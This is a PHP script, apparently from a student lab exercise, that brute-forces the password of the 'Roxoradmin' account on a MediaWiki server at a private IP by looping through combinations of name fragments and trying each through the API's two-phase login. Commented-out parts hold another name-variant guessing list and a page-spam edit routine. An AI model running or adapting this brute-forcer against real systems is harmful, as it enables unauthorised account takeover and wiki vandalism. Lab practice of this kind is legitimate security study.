<?php

	$param['wikiroot'] = "172.24.141.124/";//.124/ -> pour le groupe 2
	$param['user'] = "fake";
	$param['pwd'] = "fake123456";
	$param['cookiefile'] = "cookies.tmp";
	

	function parse_to_post($tab){
		$msg="";
		foreach($tab as $id=>$value) {
			$msg.=$id.'='.$value.'&';
		}
		return rtrim($msg,'&');// taij le last &
	}
	
	function addFormat(){
		return '&format=php';
	}
	//http	fct
	function httpRequest($url,$urlencoded=false, $post="") {
        global $param;

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
		curl_setopt ($ch, CURLOPT_COOKIEFILE, $param['cookiefile']);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, $param['cookiefile']);
		if (!empty($post)) { curl_setopt($ch,CURLOPT_POSTFIELDS,$post);}
		//if ($urlencoded==true) {echo "OUI"; curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));}
		//curl_setopt($ch, CURLOPT_VERBOSE, true); // Display communication with server
		
		$result = curl_exec($ch);
		if (!$result) {
		  exit('cURL Error: '.curl_error($ch));
		}
		curl_close($ch);
		print_r(unserialize($result));
			
		return unserialize($result);//car format php=> voir si on garde
	}	
	
	//gére les 2 phases de login , renvoi tjs le token( est ce bien utile, on ne sait pas)!==>c'est pouri sa renvoit une erreur de merde dans le second cas !!
	function login($usr,$pwd,$token=""){
		global $param;
		$url_login=$param['wikiroot']."api.php?action=login";
		$url_login.=addFormat();
		$param_post=parse_to_post(array('action'=>'login','lgname'=>$usr,'lgpassword'=>$pwd));
		if (!empty($token)) {$param_post .= "&lgtoken=$token";}
		$data = httpRequest($url_login,false,$param_post);
		 if (empty($data)) {
                exit("YA UNE COUILLE DANS LE PATé !!~ et pas que  é_è");
        }
		if (empty($token)) {
			if ($data['login']['result']!= "NeedToken"){// un pregmatch serait plus beau ici, connard!
				//exit("ca-va-pas phase 1_login");
			}
		}else {
			if ($data['login']['result']!= "Success"){// pareil pour ici sale gosse !!nan mais je rêve !
				//exit("ca-va-pas phase 2_login");
			}
		}
		if (isset($data['login']['token'])){return $data['login']['token'];}
		else {return $data['login']['result'];}
	}

	/*
	$tab=array(
	//0=>"",
	1=>"Debuf",
	2=>"debuf",
	3=>"DEBUF",
	4=>"d",
	5=>"D",	
	6=>"Debra",
	7=>"debra",
	8=>"DEBRA",
	9=>"d",
	10=>"D",
	11=>"Kaiser",
	12=>"kaiser",
	13=>"KAISER",
	14=>"k",
	15=>"K",
	16=>"Janati",
	17=>"janati",
	18=>"JANATI",
	19=>"j",
	20=>"J",
	21=>"tux",
	22=>"Tux",
	23=>"TUX",
	24=>"t",
	25=>"T",
	26=>"staross",
	27=>"Staross",
	28=>"STAROSS",
	29=>"s",
	30=>"S",
	31=>"benesai",
	32=>"Benesai",
	33=>"BENESAI",
	34=>"b",
	35=>"B",	
	36=>"momo",
	37=>"Momo",
	38=>"MOMO",
	39=>"m",
	40=>"M"
	);*/
	$tab=array(
	0=>"2013",
	1=>"mim",
	2=>"ke",
	3=>"ju",
	4=>"se",
	5=>"mo",
	6=>"de",
	7=>"de",
	8=>"ka",
	9=>"ja"
	);

	set_time_limit(1800);
	for($i=2;$i<10;$i++){
		for($j=2;$j<10;$j++){
			for($k=2;$k<10;$k++){
				for($l=2;$l<10;$l++){
					for($m=0;$m<2;$m++){
						for($n=0;$n<2;$n++){
							$ww=$tab[$i].$tab[$j].$tab[$k].$tab[$l].$tab[$m].$tab[$n];
							echo "</br>$i/$j/$k/$l/$m/$n -->$ww </br>";
							$token = login("Roxoradmin", $ww);
							$r=login("Roxoradmin", $ww, $token);
							if ($r=="Success"){
								exit ("GG  go test: $ww");
								}
							}
						}
					}
				}
			}
		}
	/*
	$start=microtime(true);
	$token = login($param['user'], $param['pwd']);
	login($param['user'], $param['pwd'], $token);
	echo ("REUSSI C0nnexion ");
	$rdstr=generateRandStr(12);
	edit($rdstr,generateRandStr(100000));
	logout();
	$end=microtime(true);
	$time=$end-$start;
	$page_load_time = number_format($time, 3);
	echo "Debut du script: ".date("H:i:s", $start);
	echo "<br>Fin du script: ".date("H:i:s", $end);
	echo "<br>Script execute en " . $page_load_time . " sec || article :".$rdstr;
	*/
?>